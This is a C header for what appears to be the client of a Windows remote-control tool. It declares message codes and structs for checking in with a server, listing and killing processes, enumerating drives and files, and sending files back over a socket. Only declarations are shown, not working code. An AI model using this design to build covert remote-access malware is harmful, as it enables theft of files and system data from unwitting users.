#pragma once
#include <stdio.h>
#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")
#include <VersionHelpers.h>
#include <TlHelp32.h>
#include <Psapi.h>

//=================================================================
//网络功能码 
#define MSG_FUNCTION_CODE_NETWIRKING 0x1		//上线
#define MSG_FUNCTION_CODE_GET_PROCESS_LIST 0x2	//进程列表
#define MSG_FUNCTION_CODE_KEILL_PROCESS 0x3		//结束进程
#define MSG_FUNCTION_CODE_DEIVE_LETTER 0x4		//获取盘符
#define MSG_FUNCTION_CODE_FILE_TRAVERSAL 0x5	//遍历文件
#define MSG_FUNCTION_CODE_GET_FILE_INFO 0x6		//获取文件尺寸
#define MSG_FUNCTION_CODE_GET_FILE 0x7			//获取文件
#define MSG_FUNCTION_CODE_SEND_FILE 0x8			//发送文件信息
#define MSG_FUNCTION_CODE_FILE_BUFFER 0x9		//发送文件缓冲
//=================================================================




//=================================================================
//结构体
typedef struct _LinkInfo
{
	DWORD dwFuncCode;	//功能号
	char szComputerName[30];	//计算机名称
	char szSystenVersion[30];	//计算机系统版本
	char szIntranetIP[20];	//外网IP
	char szNetWorkIP[20];	//内网IP
}LinkInfo, * PLinkInfo;

//进程信息结构
typedef struct _ProcessListInfo
{
	DWORD dwFuncCode;				//功能号
	DWORD dwProcessID;				//进程ID
	DWORD dwParenProcessID;			//父进程ID
	char szProcessName[128];		//进程名
	char szProcessPath[MAX_PATH];	//进程路径
}ProcessListInfo, * ProcessListInfo_PTR;

//结束进程结构
typedef struct _KillProcessInfo
{
	DWORD dwFuncCode;				//功能号
	DWORD dwProcessID;				//进程ID
}KillProcessInfo, * PKillProcessInfo;

//盘符遍历结构
typedef struct _DriveLetterInfo
{
	DWORD dwFuncCode;				//功能号
	char szDisk[10];				//盘符名称
	char szDiskType[20];			//盘符类型
	SHFILEINFO FileInfo;			//文件信息
}DriveLetterInfo, * PDriveLetterInfo;

//文件遍历结构
typedef struct _DiskFileInfo
{
	DWORD dwFuncCode;				//功能号
	char szFilePath[MAX_PATH];		//文件路径
	char szFileInfo[50];			//备注信息
	SHFILEINFO FileInfo;			//文件信息
}DiskFileInfo, * PDiskFileInfo;

//文件取回结构
typedef struct _GetFileInfo
{
	DWORD dwFuncCode;				//功能号
	DWORD dwFileSize;				//文件尺寸
	char szFilePath[MAX_PATH];		//文件路径
}GetFileInfo, * PGetFileInfo;

//=================================================================


//=================================================================
// 全局变量
SOCKET SocketClient;
sockaddr_in AddrServer;
LinkInfo NetWorkingBuffer;
ProcessListInfo ProcessListBuffer;
DriveLetterInfo DriveLetterBuffer;
DiskFileInfo DiskFileBuffer;
GetFileInfo GetFileBuffer;
//=================================================================
typedef void(__stdcall* NTPROC)(DWORD*, DWORD*, DWORD*);
//=================================================================
//函数声明
BOOL InitSocket();//初始化网络
BOOL CleanSocket();//清理网络
BOOL InitNetWorkingInfo();//初始化上线结构
BOOL GetSystemOSVersion(char* szBuffer);//获取系统版本
BOOL SendInfoToServer(DWORD dwCode);//发包函数
DWORD GetWinVer();//Win8以上版本号获取
BOOL SendInfoToServer(DWORD dwCode);//执行功能号并发送
VOID SendData(LPVOID lpSendBuffer, DWORD64 dwBufferLength);//动态发送数据
VOID NwSendData(LPVOID lpSendBuffer, DWORD64 dwBufferLength);
DWORD GetSocketData(LPVOID* lpRetFileBuffer);//动态接收数据
BOOL SocketThreadCallBack(LPVOID lpBuffer);//执行功能号回调
BOOL SendProcessList();//发送线程信息
BOOL KillProcess(DWORD dwProcessID);//结束进程
BOOL GetDriver();//遍历盘符
BOOL TraversalFiles(PCHAR pcPath);//获取文件目录信息
//=================================================================